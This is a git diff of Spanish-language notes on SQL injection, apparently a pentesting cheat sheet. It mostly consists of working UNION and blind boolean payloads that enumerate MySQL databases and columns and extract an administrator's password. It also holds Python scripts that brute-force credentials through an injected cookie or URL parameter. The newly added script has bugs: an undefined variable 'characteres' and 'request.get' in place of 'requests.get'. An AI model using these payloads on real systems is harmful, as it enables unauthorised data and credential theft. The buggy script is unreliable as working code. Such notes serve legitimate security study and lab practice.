@@ -82,8 +82,8 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 # MYSQL
 
 ❯ ' union select schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes  
-❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Nos muestra la primer base de datos existente, la cual podemos ir variando, limitando a 1 resultado, el que varia es el 0 a 1,2,3, etc...
-❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Nos muestra todas las bases de datos existentes, pero separadas por comas
+❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Nos muestra la primer base de datos existente, la cual podemos ir variando, limitando a 1 resultado, el que varia es el '0' a 1,2,3, etc...
+❯ ' union select group_concat(schema_name) from information_schema.schemata-- -      # Nos muestra todas las bases de datos existentes en una linea, pero separadas por comas
 ```
 
 ### Para saber las tablas de la base de datos (DB) especifica.
@@ -107,9 +107,9 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ```bash 
 # MYSQL 
 
-❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las tablas existentes
-❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
-❯ ' union select group_concat(column_name) from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
+❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las columnas existentes
+❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las columnas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
+❯ ' union select group_concat(column_name) from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -     # Nos muestra las columnas existentes en una sola linea, pero separadas por comas
 ```
 
 ```bash 
@@ -164,31 +164,98 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 
 ## Inyecciones Blind con respuesta condicional 
 
+-   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
+Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Condiciones**
+
 ```bash 
-❯ ' and substr((Consulta)Inicio,longitud))=''                                                   # Forma de usar el substr
+# Esto funciona cuando hay un error visual en la pagina web 
+
+❯ ' and substr((Consulta), Inicio, longitud))=''                          # Forma de usar el substr
 	# Longitud = Los caracteres que vamos a extraer
 	# Inicio = Es la posicion inicial del caracter a comparar 
 	# Consulta = Es la peticion que vamos a hacer
 
-❯ ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)='A'      # Bases MSSQL
+❯ ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)='A'      # Bases MYSQL
 	# Donde 0 indica la primer base de datos y es el valor que ira variando, esto dependiendo de las bases de datos que existan
 	# El segundo '1' es la posicion de la letra en cada palabra y este valor ira variando para ir avanzando a las sig. posiciones de la palabra
 	# 'A' es la letra a la que queremos igualar la consulta 
+
+Los primero dos numeros son para ir avanzando en el nombre de la base de datos, los otros dos son para ir avanzando entre las diferentes bases de datos que existan... 
 ```
 
+```bash 
+# Encontrar el usuario de la tabla conocida 
+
+#  Confirmar cada caracter del usuario 'administrator' en la tabla 'users'
+❯ ' and (select substring(username,1,1) from users where username='administrator')='a' -- -  
+❯ ' and (select substring(username,2,1) from users where username='administrator')='d' -- -
+
+# Obtener cada caracter de la password, del usuario 'adminnistrator' en la tabla 'users'
+❯ ' and (select substring(password,1,1) from users where username='administrator')='a' -- - 
+
+# Conocer la longitud de la passwd 
+❯ ' and (select 'a' from users where username='administrator' and length(password)>5)='a'-- -
+	# Podemos ir variando el numero hasta dar con la longitid (>,<,<=,=,>=)
+```
+
+```python
+# Obtener la passwd de un usuario conocido en una DB conocida 
+
+#!/usr/bin/python3
+
+from pwn import *
+import requests
+import signal
+import sys
+import time
+import string
+import pdb
+
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+# Ctrl + c
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://localhost/searchUsers.php"
+characters = string.ascii_lowercase + string.digits
+
+def MakeSQLI():
+
+    password = ""
+    p1 = log.progress("Fuerza Bruta")
+    p1.status("Iniciando fuerza bruta")
+    time.sleep(2)
+    p2 = log.progress("Password")
+
+    for position in range(1, 21):
+	    for character in characteres:
+		    cookies = {
+			    'TrackingID': "shasfdgh' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
+			    'session': 'ajeirbji'
+		    }
+		    p1.status(cookies['TrackingID'])
+		    r = request.get(main_url, cookies=cookies)
+		    if "Welcome back!" in r.text:         # Texto donde esta el error en la pagina, si sale eso es correcto 
+			    password += character
+			    p2.status(password)
+			    break
+
+if __name__ == '__main__':
+    MakeSQLI()
+```
 
 ## Inyección Blind con error condicional 
 
 ```bash 
-
+# Esto es cuando miras un error '500 internal server error' o un '200 ok' cuando esta bien la consulta
 ```
 
 ## Inyecciones sin ver el error en el Output 'Blind'
 
--   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
-Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Condiciones**
-
-* **SQL Conditional**: Parra este caso debemos de hacer el Script en Python3
 ```python
 #!/usr/bin/python3
 
@@ -218,7 +285,7 @@ def MakeSQLI():
     extrated_info = ""
 
     for position in range(1, 150):
-        for character in range(33, 126): # El 9 de abajo es un valor que no existe
+        for character in range(33, 126): # El 9 es un valor que no existe en la web
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
 #           sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
             p1.status(sqli_url)
@@ -234,7 +301,8 @@ if __name__ == '__main__':
 ```
 
 
-## SQL Time: Para este caso debemos de hacer el Script en Python3
+## SQL Time con Python3
+
 ```python 
 #!/usr/bin/python3
 
